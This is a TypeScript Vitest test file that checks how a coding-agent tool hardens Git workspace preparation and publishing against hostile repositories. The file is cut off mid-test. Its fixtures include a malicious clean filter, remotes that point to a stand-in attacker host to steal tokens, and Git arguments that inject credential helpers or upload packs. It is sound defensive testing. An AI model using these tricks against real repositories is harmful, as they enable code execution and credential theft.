import path from 'node:path';
import fs from 'node:fs';
import os from 'node:os';
import { spawnSync } from 'node:child_process';
import { createHash } from 'node:crypto';

import { describe, expect, it, vi } from 'vitest';

vi.mock('./config.js', () => ({
  CODING_WORKSPACE_DIR: '/safe/coding-workspaces',
}));

import {
  collectCodingWorkspaceEvidence,
  publishCodingWorkspace,
  prepareCodingWorkspace,
  runApprovedHostGit,
  validateCodingBranch,
  validateCodingRepoSlug,
  type CodingWorkspaceInput,
  type GitTransport,
} from './coding-workspace.js';

const jobsRoot = '/safe/coding-workspaces/jobs';
const jobRoot = `${jobsRoot}/job-129`;
const workspace = `${jobRoot}/owner__repo`;
const metadataDir = `${jobRoot}/.nanocrab`;
const token = 'test-secret-token';
const trustTestGitMetadata = async () => undefined;

const firstRunInput: CodingWorkspaceInput = {
  jobId: 'job-129',
  repo: 'owner/repo',
  defaultBranch: 'main',
  branch: 'nanocrab/issue-129',
  workspace,
  isFirstRun: true,
};

function stats(kind: 'directory' | 'symlink' = 'directory'): fs.Stats {
  return {
    isDirectory: () => kind === 'directory',
    isSymbolicLink: () => kind === 'symlink',
  } as fs.Stats;
}

function missingError(): NodeJS.ErrnoException {
  return Object.assign(new Error('missing'), { code: 'ENOENT' });
}

function gitResult(stdout = '', stderr = '', exitCode = 0) {
  return { stdout, stderr, exitCode };
}

function createHostGitExploitFixture(
  options: { localIdentity?: boolean } = {},
): {
  root: string;
  workspace: string;
  marker: string;
  git: GitTransport;
  pushes: readonly string[][];
} {
  const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nanocrab-publish-test-'));
  const requestedWorkspace = path.join(root, 'repo');
  const marker = path.join(root, 'filter-executed');
  fs.mkdirSync(requestedWorkspace);
  const exploitWorkspace = fs.realpathSync(requestedWorkspace);
  const run = (args: readonly string[], env?: NodeJS.ProcessEnv) => {
    const result = spawnSync('git', [...args], {
      cwd: exploitWorkspace,
      encoding: 'utf8',
      env,
    });
    if (result.status !== 0) {
      throw new Error(result.stderr || `git ${args.join(' ')} failed`);
    }
    return result.stdout;
  };
  run(['init', '-q']);
  if (options.localIdentity !== false) {
    run(['config', 'user.email', 'test@example.com']);
    run(['config', 'user.name', 'NanoCrab Test']);
  }
  fs.writeFileSync(path.join(exploitWorkspace, 'payload.txt'), 'baseline\n');
  run(['add', 'payload.txt']);
  run(
    ['commit', '-qm', 'baseline'],
    options.localIdentity === false
      ? {
          ...process.env,
          GIT_AUTHOR_NAME: 'Bootstrap',
          GIT_AUTHOR_EMAIL: 'bootstrap@example.invalid',
          GIT_COMMITTER_NAME: 'Bootstrap',
          GIT_COMMITTER_EMAIL: 'bootstrap@example.invalid',
        }
      : undefined,
  );
  run(['checkout', '-qb', 'nanocrab/issue-129']);
  fs.writeFileSync(
    path.join(exploitWorkspace, '.gitattributes'),
    'payload.txt filter=steal\n',
  );
  fs.writeFileSync(path.join(exploitWorkspace, 'payload.txt'), 'changed\n');
  run(['config', 'filter.steal.clean', `sh -c 'touch "${marker}"; cat'`]);
  run(['config', 'filter.steal.required', 'true']);
  run(['remote', 'add', 'origin', 'https://attacker.invalid/fetch.git']);
  run([
    'remote',
    'set-url',
    '--push',
    'origin',
    'https://attacker.invalid/steal-token.git',
  ]);

  const pushes: string[][] = [];
  const git = vi.fn<GitTransport>(async (args, options) => {
    if (args[0] === 'push') {
      pushes.push([...args]);
      return gitResult();
    }
    const result = spawnSync('git', [...args], {
      cwd: options.cwd,
      env: options.env,
      encoding: 'utf8',
      input: (options as { stdin?: string }).stdin,
    });
    return gitResult(
      result.stdout || '',
      result.stderr || '',
      result.status ?? 1,
    );
  });
  return { root, workspace: exploitWorkspace, marker, git, pushes };
}

function baseDeps(
  options: {
    workspaceExists?: boolean;
    canonicalWorkspace?: string;
    git?: GitTransport;
  } = {},
) {
  const workspaceExists = options.workspaceExists ?? false;
  const git = options.git ?? vi.fn<GitTransport>(async () => gitResult());
  const lstat = vi.fn(async (value: string) => {
    if (value === workspace && !workspaceExists) throw missingError();
    if (value === `${workspace}/.git` && !workspaceExists) throw missingError();
    return stats();
  });
  const mkdir = vi.fn(
    async () => undefined,
  ) as unknown as typeof fs.promises.mkdir;
  const realpath = vi.fn(async (value: string) => {
    if (value === workspace) return options.canonicalWorkspace ?? workspace;
    return path.resolve(value);
  });
  const dispose = vi.fn(async () => undefined);
  const createAskpass = vi.fn(async () => ({
    path: '/private/tmp/nanocrab-askpass/helper.sh',
    dispose,
  }));

  return {
    git,
    lstat,
    mkdir,
    realpath,
    githubToken: token,
    createAskpass,
    dispose,
  };
}

function localCheckoutGit() {
  return vi.fn<GitTransport>(async (args) => {
    switch (args[0]) {
      case 'rev-parse':
        return gitResult('true\n');
      case 'remote':
        return gitResult('https://github.com/owner/repo.git\n');
      case 'branch':
        return gitResult('nanocrab/issue-129\n');
      case 'status':
        return gitResult('M  staged.ts\n M dirty.ts\n?? new.ts\n');
      case 'log':
        return gitResult('abc123 subject\n');
      default:
        throw new Error(`unexpected fake Git call: ${args.join(' ')}`);
    }
  });
}

describe('coding workspace', () => {
  it('publishes changes only through hardened local Git and approved askpass push', async () => {
    const assertOwnership = vi.fn();
    const treeId = 'a'.repeat(40);
    const parentSha = 'b'.repeat(40);
    const commitSha = 'c'.repeat(40);
    const git = vi.fn<GitTransport>(async (args) => {
      if (args[0] === 'symbolic-ref') return gitResult('nanocrab/issue-129\n');
      if (args[0] === 'write-tree') return gitResult(`${treeId}\n`);
      if (args[0] === 'rev-parse') return gitResult(`${parentSha}\n`);
      if (args[0] === 'commit-tree') return gitResult(`${commitSha}\n`);
      return gitResult();
    });
    const dispose = vi.fn(async () => undefined);
    const createAskpass = vi.fn(async () => ({
      path: '/private/tmp/askpass/helper.sh',
      dispose,
    }));

    const result = await publishCodingWorkspace(
      {
        workspace,
        repo: 'owner/repo',
        branch: 'nanocrab/issue-129',
        commitMessage: 'fix: publish safely',
        token,
        assertOwnership,
      },
      { git, createAskpass, validateGitMetadata: trustTestGitMetadata },
    );

    expect(result).toEqual({ commitSha, signingStatus: 'unsigned' });
    expect(git.mock.calls.map(([args]) => args)).toEqual([
      ['ls-files', '--stage', '--cached', '-z'],
      ['ls-files', '--others', '--exclude-standard', '-z'],
      ['update-index', '-z', '--index-info'],
      ['symbolic-ref', '--quiet', '--short', 'HEAD'],
      ['write-tree'],
      ['rev-parse', '--verify', 'HEAD'],
      [
        'commit-tree',
        treeId,
        '-p',
        parentSha,
        '--no-gpg-sign',
        '-m',
        'fix: publish safely',
      ],
      ['update-ref', 'refs/heads/nanocrab/issue-129', commitSha, parentSha],
      [
        'push',
        'https://github.com/owner/repo.git',
        'nanocrab/issue-129:refs/heads/nanocrab/issue-129',
        '--force-with-lease',
      ],
    ]);
    expect(assertOwnership).toHaveBeenCalledTimes(10);
    for (const [, options] of git.mock.calls.slice(0, -1)) {
      expect(options.env).toMatchObject({
        PATH: '/usr/local/bin:/usr/bin:/bin',
        GIT_CONFIG_SYSTEM: '/dev/null',
        GIT_CONFIG_GLOBAL: '/dev/null',
        GIT_CONFIG_NOSYSTEM: '1',
        GIT_WORK_TREE: workspace,
      });
      expect(options.env).not.toHaveProperty('HOME');
      expect(options.env).not.toHaveProperty('GIT_ASKPASS');
      expect(options.env).not.toHaveProperty('NANOCRAB_GIT_TOKEN');
      const config = Array.from(
        { length: Number(options.env.GIT_CONFIG_COUNT) },
        (_, index) => [
          options.env[`GIT_CONFIG_KEY_${index}`],
          options.env[`GIT_CONFIG_VALUE_${index}`],
        ],
      );
      expect(config).toEqual(
        expect.arrayContaining([
          ['credential.helper', ''],
          ['credential.interactive', 'never'],
          ['core.hooksPath', '/dev/null'],
          ['commit.gpgSign', 'false'],
          ['tag.gpgSign', 'false'],
        ]),
      );
    }
    expect(git.mock.calls.at(-1)![1].env).toMatchObject({
      GIT_ASKPASS: '/private/tmp/askpass/helper.sh',
      NANOCRAB_GIT_TOKEN: token,
    });
    expect(dispose).toHaveBeenCalledOnce();
  });

  it('sanitizes local publication failures before they reach coding-job state', async () => {
    const git = vi.fn<GitTransport>(async () => {
      throw new Error(`repo hook leaked ${token}`);
    });

    await expect(
      publishCodingWorkspace(
        {
          workspace,
          repo: 'owner/repo',
          branch: 'nanocrab/issue-129',
          commitMessage: 'fix: publish safely',
          token,
          assertOwnership: vi.fn(),
        },
        { git, validateGitMetadata: trustTestGitMetadata },
      ),
    ).rejects.toThrow('Git tracked-file inventory failed');
    await expect(
      publishCodingWorkspace(
        {
          workspace,
          repo: 'owner/repo',
          branch: 'nanocrab/issue-129',
          commitMessage: 'fix: publish safely',
          token,
          assertOwnership: vi.fn(),
        },
        { git, validateGitMetadata: trustTestGitMetadata },
      ),
    ).rejects.not.toThrow(token);
  });

  it('requires a verified host signature when repository policy is require', async () => {
    const assertOwnership = vi.fn();
    const treeId = 'd'.repeat(40);
    const parentSha = 'e'.repeat(40);
    const commitSha = 'f'.repeat(40);
    const git = vi.fn<GitTransport>(async (args) => {
      if (args[0] === 'symbolic-ref') return gitResult('nanocrab/issue-129\n');
      if (args[0] === 'write-tree') return gitResult(`${treeId}\n`);
      if (args[0] === 'rev-parse') return gitResult(`${parentSha}\n`);
      if (args[0] === 'commit-tree') return gitResult(`${commitSha}\n`);
      if (args[0] === 'verify-commit') return gitResult();
      return gitResult();
    });

    const result = await publishCodingWorkspace(
      {
        workspace,
        repo: 'owner/repo',
        branch: 'nanocrab/issue-129',
        commitMessage: 'fix: sign publication',
        token,
        assertOwnership,
        commitSigningPolicy: 'require',
        signingKey: 'bot@example.com',
      },
      { git, validateGitMetadata: trustTestGitMetadata },
    );

    expect(result).toEqual({ commitSha, signingStatus: 'signed' });
    expect(git.mock.calls.map(([args]) => args)).toContainEqual([
      'commit-tree',
      treeId,
      '-p',
      parentSha,
      '--gpg-sign=bot@example.com',
      '-m',
      'fix: sign publication',
    ]);
    expect(git.mock.calls.map(([args]) => args)).toContainEqual([
      'verify-commit',
      commitSha,
    ]);
  });

  it('falls back to an unsigned commit with evidence when preferred signing is unavailable', async () => {
    const treeId = '1'.repeat(40);
    const parentSha = '2'.repeat(40);
    const commitSha = '3'.repeat(40);
    let commitAttempts = 0;
    const git = vi.fn<GitTransport>(async (args) => {
      if (args[0] === 'symbolic-ref') return gitResult('nanocrab/issue-129\n');
      if (args[0] === 'write-tree') return gitResult(`${treeId}\n`);
      if (args[0] === 'rev-parse') return gitResult(`${parentSha}\n`);
      if (args[0] === 'commit-tree') {
        commitAttempts += 1;
        return args.includes('--no-gpg-sign')
          ? gitResult(`${commitSha}\n`)
          : gitResult('', 'signer unavailable', 1);
      }
      return gitResult();
    });

    const result = await publishCodingWorkspace(
      {
        workspace,
        repo: 'owner/repo',
        branch: 'nanocrab/issue-129',
        commitMessage: 'fix: prefer signing',
        token,
        assertOwnership: vi.fn(),
        commitSigningPolicy: 'prefer',
        signingKey: 'missing@example.com',
      },
      { git, validateGitMetadata: trustTestGitMetadata },
    );

    expect(result).toEqual({
      commitSha,
      signingStatus: 'preferred-unsigned',
      signingWarning: 'Git commit creation failed',
    });
    expect(commitAttempts).toBe(2);
  });

  it('stages model-written attributes without executing repository clean filters', async () => {
    const fixture = createHostGitExploitFixture();
    try {
      await publishCodingWorkspace(
        {
          workspace: fixture.workspace,
          repo: 'owner/repo',
          branch: 'nanocrab/issue-129',
          commitMessage: 'fix: safe staging',
          token,
          assertOwnership: vi.fn(),
        },
        {
          git: fixture.git,
          createAskpass: async () => ({
            path: '/private/tmp/askpass/helper.sh',
            dispose: async () => undefined,
          }),
        },
      );

      expect(fs.existsSync(fixture.marker)).toBe(false);
      expect(
        spawnSync('git', ['show', 'HEAD:payload.txt'], {
          cwd: fixture.workspace,
          encoding: 'utf8',
        }).stdout,
      ).toBe('changed\n');
    } finally {
      fs.rmSync(fixture.root, { recursive: true, force: true });
    }
  });

  it('collects host evidence without executing repository clean filters', async () => {
    const fixture = createHostGitExploitFixture();
    try {
      await collectCodingWorkspaceEvidence(fixture.workspace, {
        git: fixture.git,
      });

      expect(fs.existsSync(fixture.marker)).toBe(false);
    } finally {
      fs.rmSync(fixture.root, { recursive: true, force: true });
    }
  });

  it('ignores mutable origin and pushurl when publishing an approved repository', async () => {
    const fixture = createHostGitExploitFixture();
    try {
      await publishCodingWorkspace(
        {
          workspace: fixture.workspace,
          repo: 'owner/repo',
          branch: 'nanocrab/issue-129',
          commitMessage: 'fix: trusted remote',
          token,
          assertOwnership: vi.fn(),
        },
        {
          git: fixture.git,
          createAskpass: async () => ({
            path: '/private/tmp/askpass/helper.sh',
            dispose: async () => undefined,
          }),
        },
      );

      expect(fixture.pushes).toEqual([
        [
          'push',
          'https://github.com/owner/repo.git',
          'nanocrab/issue-129:refs/heads/nanocrab/issue-129',
          '--force-with-lease',
        ],
      ]);
    } finally {
      fs.rmSync(fixture.root, { recursive: true, force: true });
    }
  });

  it('rejects replaced Git object metadata before publication can write outside the workspace', async () => {
    const fixture = createHostGitExploitFixture();
    const gitDir = path.join(fixture.workspace, '.git');
    const outsideObjects = path.join(fixture.root, 'outside-objects');
    fs.renameSync(path.join(gitDir, 'objects'), outsideObjects);
    fs.symlinkSync(outsideObjects, path.join(gitDir, 'objects'));
    const before = fs.readdirSync(outsideObjects, { recursive: true }).sort();
    try {
      await expect(
        collectCodingWorkspaceEvidence(fixture.workspace, {
          git: fixture.git,
        }),
      ).rejects.toThrow(/Git metadata/i);
      await expect(
        publishCodingWorkspace(
          {
            workspace: fixture.workspace,
            repo: 'owner/repo',
            branch: 'nanocrab/issue-129',
            commitMessage: 'fix: reject replaced metadata',
            token,
            assertOwnership: vi.fn(),
          },
          {
            git: fixture.git,
            createAskpass: async () => ({
              path: '/private/tmp/askpass/helper.sh',
              dispose: async () => undefined,
            }),
          },
        ),
      ).rejects.toThrow(/Git metadata/i);

      expect(
        fs.readdirSync(outsideObjects, { recursive: true }).sort(),
      ).toEqual(before);
      expect(fixture.pushes).toEqual([]);
    } finally {
      fs.rmSync(fixture.root, { recursive: true, force: true });
    }
  });

  it('creates commits with deterministic NanoCrab identity without host or repo identity', async () => {
    const fixture = createHostGitExploitFixture({ localIdentity: false });
    try {
      await publishCodingWorkspace(
        {
          workspace: fixture.workspace,
          repo: 'owner/repo',
          branch: 'nanocrab/issue-129',
          commitMessage: 'fix: deterministic identity',
          token,
          assertOwnership: vi.fn(),
        },
        {
          git: fixture.git,
          createAskpass: async () => ({
            path: '/private/tmp/askpass/helper.sh',
            dispose: async () => undefined,
          }),
        },
      );

      const identity = spawnSync(
        'git',
        ['show', '-s', '--format=%an|%ae|%cn|%ce', 'HEAD'],
        { cwd: fixture.workspace, encoding: 'utf8' },
      ).stdout.trim();
      expect(identity).toBe(
        'NanoCrab Bot|nanocrab@localhost|NanoCrab Bot|nanocrab@localhost',
      );
      const dates = spawnSync(
        'git',
        ['show', '-s', '--format=%aI|%cI', 'HEAD'],
        { cwd: fixture.workspace, encoding: 'utf8' },
      ).stdout.trim();
      expect(dates).toMatch(
        /^\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z\|\d{4}-\d{2}-\d{2}T\d{2}:\d{2}:\d{2}Z$/,
      );
    } finally {
      fs.rmSync(fixture.root, { recursive: true, force: true });
    }
  });

  it('collects fresh credential-free host Git evidence after a Devin run', async () => {
    const originalObject = 'a'.repeat(40);
    const changedObject = 'b'.repeat(40);
    const untrackedObject = 'c'.repeat(40);
    const git = vi.fn<GitTransport>(async (args) => {
      if (args.join(' ') === 'ls-files --stage --cached -z') {
        return gitResult(`100644 ${originalObject} 0\tsrc/a.ts\0`);
      }
      if (args.join(' ') === 'ls-files --others --exclude-standard -z') {
        return gitResult('src/new.ts\0');
      }
      if (args[0] === 'hash-object') {
        return gitResult(
          `${args.at(-1) === 'src/a.ts' ? changedObject : untrackedObject}\n`,
        );
      }
      if (args[0] === 'diff' && args[1] === '--cached') {
        return gitResult();
      }
      throw new Error(`unexpected fake Git call: ${args.join(' ')}`);
    });

    const evidence = await collectCodingWorkspaceEvidence(workspace, {
      git,
      validateGitMetadata: trustTestGitMetadata,
      lstat: async () =>
        ({
          isDirectory: () => false,
          isSymbolicLink: () => false,
          isFile: () => true,
          mode: 0o100644,
        }) as fs.Stats,
    });

    expect(evidence).toEqual({
      diffStat: '2 files changed (filter-free evidence)',
      changedFiles: ['src/a.ts'],
      untrackedFiles: ['src/new.ts'],
      testEvidence: {
        status: 'not_reported',
        summary:
          'No trusted test evidence was reported by the Devin host runner.',
      },
    });
    expect(git.mock.calls.map(([args]) => args)).toEqual([
      ['ls-files', '--stage', '--cached', '-z'],
      ['ls-files', '--others', '--exclude-standard', '-z'],
      ['hash-object', '--no-filters', '--', 'src/a.ts'],
      ['hash-object', '--no-filters', '--', 'src/new.ts'],
      [
        'diff',
        '--cached',
        '--no-ext-diff',
        '--no-textconv',
        '--name-only',
        'HEAD',
      ],
    ]);
    for (const [, options] of git.mock.calls) {
      expect(options.cwd).toBe(workspace);
      expect(options.env).toMatchObject({
        PATH: '/usr/local/bin:/usr/bin:/bin',
        GIT_CONFIG_SYSTEM: '/dev/null',
        GIT_CONFIG_GLOBAL: '/dev/null',
        GIT_CONFIG_NOSYSTEM: '1',
        GIT_AUTHOR_NAME: 'NanoCrab Bot',
        GIT_AUTHOR_EMAIL: 'nanocrab@localhost',
        GIT_COMMITTER_NAME: 'NanoCrab Bot',
        GIT_COMMITTER_EMAIL: 'nanocrab@localhost',
      });
      expect(options.env).not.toHaveProperty('GIT_ASKPASS');
      expect(options.env).not.toHaveProperty('NANOCRAB_GIT_TOKEN');
    }
  });

  it('prepares a missing first-run checkout with argument-array Git calls', async () => {
    const deps = baseDeps();

    const prepared = await prepareCodingWorkspace(firstRunInput, deps);

    expect(
      (deps.git as ReturnType<typeof vi.fn>).mock.calls.map(([args]) => args),
    ).toEqual([
      [
        'clone',
        '--depth',
        '50',
        'https://github.com/owner/repo.git',
        workspace,
      ],
      ['fetch', 'origin', 'main', '--depth', '50'],
      ['checkout', '-B', 'main', 'origin/main'],
      ['checkout', '-B', 'nanocrab/issue-129'],
    ]);
    expect(prepared).toEqual({
      jobRoot,
      metadataDir,
      workspace,
      resumed: false,
      gitState: { staged: '', unstaged: '', untracked: '', unpushed: '' },
    });
  });

  it('resumes a dirty retry without fetch reset checkout clean or delete', async () => {
    const git = localCheckoutGit();
    const deps = baseDeps({ workspaceExists: true, git });

    const prepared = await prepareCodingWorkspace(
      { ...firstRunInput, isFirstRun: false },
      deps,
    );

    expect(prepared.gitState).toEqual({
      staged: 'M  staged.ts',
      unstaged: ' M dirty.ts',
      untracked: 'new.ts',
      unpushed: 'abc123 subject',
    });
    const flattenedGitArgs = git.mock.calls
      .map(([args]) => args.join(' '))
      .join('\n');
    expect(flattenedGitArgs).not.toMatch(/fetch|reset|checkout|clean/);
    expect(prepared.resumed).toBe(true);
  });

  it('validates and resumes an unexpected existing first-run checkout without rewriting it', async () => {
    const git = localCheckoutGit();
    const deps = baseDeps({ workspaceExists: true, git });

    const prepared = await prepareCodingWorkspace(firstRunInput, deps);

    expect(prepared.resumed).toBe(true);
    expect(git.mock.calls.map(([args]) => args[0])).toEqual([
      'rev-parse',
      'remote',
      'branch',
      'status',
      'log',
    ]);
  });

  it('uses only credential-free trusted environment for local inspections', async () => {
    const git = localCheckoutGit();
    const deps = baseDeps({ workspaceExists: true, git });

    await prepareCodingWorkspace({ ...firstRunInput, isFirstRun: false }, deps);

    for (const [, options] of git.mock.calls) {
      expect(options.env).toMatchObject({
        PATH: '/usr/local/bin:/usr/bin:/bin',
        LANG: 'C.UTF-8',
        LC_ALL: 'C.UTF-8',
        GIT_CONFIG_SYSTEM: '/dev/null',
        GIT_CONFIG_GLOBAL: '/dev/null',
        GIT_CONFIG_NOSYSTEM: '1',
      });
      expect(options.env).not.toHaveProperty('GIT_ASKPASS');
      expect(options.env).not.toHaveProperty('NANOCRAB_GIT_TOKEN');
      const config = Array.from(
        { length: Number(options.env.GIT_CONFIG_COUNT) },
        (_, index) => [
          options.env[`GIT_CONFIG_KEY_${index}`],
          options.env[`GIT_CONFIG_VALUE_${index}`],
        ],
      );
      expect(config).toEqual(
        expect.arrayContaining([
          ['credential.helper', ''],
          ['core.hooksPath', '/dev/null'],
          ['core.fsmonitor', 'false'],
          ['core.untrackedCache', 'false'],
          ['core.sshCommand', 'false'],
          ['submodule.recurse', 'false'],
        ]),
      );
    }
    expect(deps.createAskpass).not.toHaveBeenCalled();
  });

  it.each([
    ['owner', 'repository slug'],
    ['owner/repo/extra', 'repository slug'],
    ['../repo', 'repository slug'],
    ['owner/@repo', 'repository slug'],
  ])('rejects unsafe repository %s before filesystem or Git', async (repo) => {
    const deps = baseDeps();

    await expect(
      prepareCodingWorkspace({ ...firstRunInput, repo }, deps),
    ).rejects.toThrow(/repository slug/i);
    expect(deps.mkdir).not.toHaveBeenCalled();
    expect(deps.lstat).not.toHaveBeenCalled();
    expect(deps.git).not.toHaveBeenCalled();
  });

  it.each([
    '',
    '-topic',
    '/topic',
    'topic/',
    'topic.',
    'topic..name',
    'topic@{upstream}',
    'topic//child',
    'topic/a.lock',
    'topic/../child',
    'topic name',
    'topic~1',
  ])('rejects unsafe branch %j before filesystem or Git', async (branch) => {
    const deps = baseDeps();

    await expect(
      prepareCodingWorkspace({ ...firstRunInput, branch }, deps),
    ).rejects.toThrow(/branch/i);
    expect(deps.mkdir).not.toHaveBeenCalled();
    expect(deps.git).not.toHaveBeenCalled();
  });

  it.each([
    ['../job-129', workspace],
    ['job-129/child', workspace],
    ['job-129', `${jobsRoot}/other/repo`],
    ['job-129', 'relative/repo'],
  ])(
    'rejects unsafe job/workspace paths before Git',
    async (jobId, candidate) => {
      const deps = baseDeps();

      await expect(
        prepareCodingWorkspace(
          { ...firstRunInput, jobId, workspace: candidate },
          deps,
        ),
      ).rejects.toThrow(/workspace|job/i);
      expect(deps.git).not.toHaveBeenCalled();
    },
  );

  it('rejects a canonical workspace symlink escape before Git', async () => {
    const deps = baseDeps({
      workspaceExists: true,
      canonicalWorkspace: '/outside/owner__repo',
    });

    await expect(
      prepareCodingWorkspace({ ...firstRunInput, isFirstRun: false }, deps),
    ).rejects.toThrow(/workspace/i);
    expect(deps.git).not.toHaveBeenCalled();
  });

  it('rejects a missing checkout beneath a symlinked intermediate parent before remote Git', async () => {
    const linkedWorkspace = `${jobRoot}/linked/owner__repo`;
    const deps = baseDeps();
    deps.lstat.mockImplementation(async (value: string) => {
      if (value === linkedWorkspace) throw missingError();
      if (value === `${jobRoot}/linked`) return stats('symlink');
      return stats();
    });

    await expect(
      prepareCodingWorkspace(
        { ...firstRunInput, workspace: linkedWorkspace },
        deps,
      ),
    ).rejects.toThrow(/symlink|workspace parent/i);
    expect(deps.git).not.toHaveBeenCalled();
    expect(deps.createAskpass).not.toHaveBeenCalled();
  });

  it('rejects a job root symlink into another canonical job before remote Git', async () => {
    const otherJobRoot = `${jobsRoot}/other-job`;
    const deps = baseDeps();
    deps.lstat.mockImplementation(async (value: string) => {
      if (value === workspace) throw missingError();
      if (value === jobRoot) return stats('symlink');
      return stats();
    });
    deps.realpath.mockImplementation(async (value: string) => {
      if (value === jobRoot) return otherJobRoot;
      if (value === metadataDir) return `${otherJobRoot}/.nanocrab`;
      if (value === workspace) return `${otherJobRoot}/owner__repo`;
      return path.resolve(value);
    });

    await expect(prepareCodingWorkspace(firstRunInput, deps)).rejects.toThrow(
      /job root|symlink/i,
    );
    expect(deps.git).not.toHaveBeenCalled();
    expect(deps.createAskpass).not.toHaveBeenCalled();
  });

  it('rejects a symlinked metadata directory before filesystem or Git workspaces', async () => {
    const deps = baseDeps();
    deps.lstat.mockImplementation(async (value: string) => {
      if (value === metadataDir) return stats('symlink');
      if (value === workspace) throw missingError();
      return stats();
    });

    await expect(prepareCodingWorkspace(firstRunInput, deps)).rejects.toThrow(
      /metadata|real directory/i,
    );
    expect(deps.git).not.toHaveBeenCalled();
    expect(deps.createAskpass).not.toHaveBeenCalled();
  });

  it('rejects an existing workspace canonically aliased to protected metadata before Git', async () => {
    const deps = baseDeps({
      workspaceExists: true,
      canonicalWorkspace: metadataDir,
      git: localCheckoutGit(),
    });

    await expect(
      prepareCodingWorkspace({ ...firstRunInput, isFirstRun: false }, deps),
    ).rejects.toThrow(/metadata|workspace/i);
    expect(deps.git).not.toHaveBeenCalled();
  });

  it('rejects a workspace parent canonically aliased to protected metadata before remote Git', async () => {
    const aliasedParent = `${jobRoot}/alias`;
    const aliasedWorkspace = `${aliasedParent}/owner__repo`;
    const deps = baseDeps();
    deps.lstat.mockImplementation(async (value: string) => {
      if (value === aliasedWorkspace) throw missingError();
      return stats();
    });
    deps.realpath.mockImplementation(async (value: string) => {
      if (value === aliasedParent) return metadataDir;
      return path.resolve(value);
    });

    await expect(
      prepareCodingWorkspace(
        { ...firstRunInput, workspace: aliasedWorkspace },
        deps,
      ),
    ).rejects.toThrow(/metadata|workspace parent/i);
    expect(deps.git).not.toHaveBeenCalled();
    expect(deps.createAskpass).not.toHaveBeenCalled();
  });

  it('rejects corrupt Git metadata before local inspection', async () => {
    const deps = baseDeps({ workspaceExists: true });
    deps.lstat.mockImplementation(async (value: string) =>
      value === `${workspace}/.git` ? stats('symlink') : stats(),
    );

    await expect(
      prepareCodingWorkspace({ ...firstRunInput, isFirstRun: false }, deps),
    ).rejects.toThrow(/git metadata/i);
    expect(deps.git).not.toHaveBeenCalled();
  });

  it.each([
    ['remote', 'https://github.com/other/repo.git\n', /origin/i],
    ['remote', 'https://example.com/owner/repo.git\n', /origin/i],
    ['branch', 'wrong-branch\n', /branch/i],
    ['rev-parse', 'false\n', /work tree/i],
  ])(
    'rejects invalid existing checkout %s state',
    async (command, stdout, error) => {
      const git = localCheckoutGit();
      git.mockImplementation(async (args) =>
        args[0] === command
          ? gitResult(stdout)
          : localCheckoutGit()(args, {} as never),
      );
      const deps = baseDeps({ workspaceExists: true, git });

      await expect(
        prepareCodingWorkspace({ ...firstRunInput, isFirstRun: false }, deps),
      ).rejects.toThrow(error);
    },
  );

  it('accepts the exact SSH origin without exposing credentials', async () => {
    const git = localCheckoutGit();
    git.mockImplementation(async (args) => {
      if (args[0] === 'remote')
        return gitResult('git@github.com:owner/repo.git\n');
      return localCheckoutGit()(args, {} as never);
    });
    const deps = baseDeps({ workspaceExists: true, git });

    await expect(
      prepareCodingWorkspace({ ...firstRunInput, isFirstRun: false }, deps),
    ).resolves.toMatchObject({ resumed: true });
  });

  it('scopes askpass credentials to one approved remote call and disposes in finally', async () => {
    const git = vi.fn<GitTransport>(async () => gitResult('ok', '', 0));
    const dispose = vi.fn(async () => undefined);
    const createAskpass = vi.fn(async () => ({
      path: '/private/tmp/askpass/helper.sh',
      dispose,
    }));

    const result = await runApprovedHostGit(
      ['push', 'https://github.com/owner/repo.git', 'nanocrab/issue-129'],
      { cwd: workspace, token, git, createAskpass },
    );

    expect(git).toHaveBeenCalledWith(
      ['push', 'https://github.com/owner/repo.git', 'nanocrab/issue-129'],
      expect.objectContaining({
        cwd: workspace,
        timeoutMs: 120_000,
        env: expect.objectContaining({
          PATH: '/usr/local/bin:/usr/bin:/bin',
          LANG: 'C.UTF-8',
          LC_ALL: 'C.UTF-8',
          GIT_ASKPASS: '/private/tmp/askpass/helper.sh',
          GIT_TERMINAL_PROMPT: '0',
          NANOCRAB_GIT_TOKEN: token,
        }),
      }),
    );
    expect(result).toEqual(gitResult('ok', '', 0));
    expect(dispose).toHaveBeenCalledOnce();
  });

  it('neutralizes repository-controlled execution surfaces for credentialed Git', async () => {
    const git = vi.fn<GitTransport>(async () => gitResult());
    const createAskpass = vi.fn(async () => ({
      path: '/private/tmp/askpass/helper.sh',
      dispose: vi.fn(async () => undefined),
    }));

    await runApprovedHostGit(
      ['push', 'https://github.com/owner/repo.git', 'nanocrab/issue-129'],
      {
        cwd: workspace,
        token,
        git,
        createAskpass,
      },
    );

    const env = git.mock.calls[0][1].env;
    expect(env).toMatchObject({
      GIT_CONFIG_SYSTEM: '/dev/null',
      GIT_CONFIG_GLOBAL: '/dev/null',
      GIT_CONFIG_NOSYSTEM: '1',
      GIT_SSH_COMMAND: 'false',
    });
    const config = Array.from(
      { length: Number(env.GIT_CONFIG_COUNT) },
      (_, index) => [
        env[`GIT_CONFIG_KEY_${index}`],
        env[`GIT_CONFIG_VALUE_${index}`],
      ],
    );
    expect(config).toEqual(
      expect.arrayContaining([
        ['credential.helper', ''],
        ['credential.interactive', 'never'],
        ['core.hooksPath', '/dev/null'],
        ['core.fsmonitor', 'false'],
        ['core.sshCommand', 'false'],
        ['protocol.allow', 'never'],
        ['protocol.https.allow', 'always'],
        ['http.proxy', ''],
        ['http.curloptResolve', ''],
      ]),
    );
  });

  it.each([
    [['status']],
    [['-c', 'credential.helper=/tmp/steal', 'fetch', 'origin', 'main']],
    [['fetch', '--upload-pack=/tmp/steal', 'origin', 'main']],
    [['push', '--receive-pack=/tmp/steal', 'origin', 'main']],
    [['push', 'origin', 'main']],
    [['clone', 'ext::/tmp/steal', workspace]],
  ])('rejects unapproved credentialed Git argv %j', async (args) => {
    const git = vi.fn<GitTransport>();
    const createAskpass = vi.fn();

    await expect(
      runApprovedHostGit(args, { cwd: workspace, token, git, createAskpass }),
    ).rejects.toThrow(/approved|operation/i);
    expect(createAskpass).not.toHaveBeenCalled();
    expect(git).not.toHaveBeenCalled();
  });

  it.each([
    [
      'push',
      'https://github.com/owner/repo.git',
      'nanocrab/issue-129:refs/heads/nanocrab/issue-129',
      '--force-with-lease',
    ],
    ['push', 'https://github.com/owner/repo.git', ':nanocrab/issue-129'],
  ])('allows the exact approved NanoCrab push argv %j', async (...args) => {
    const git = vi.fn<GitTransport>(async () => gitResult());
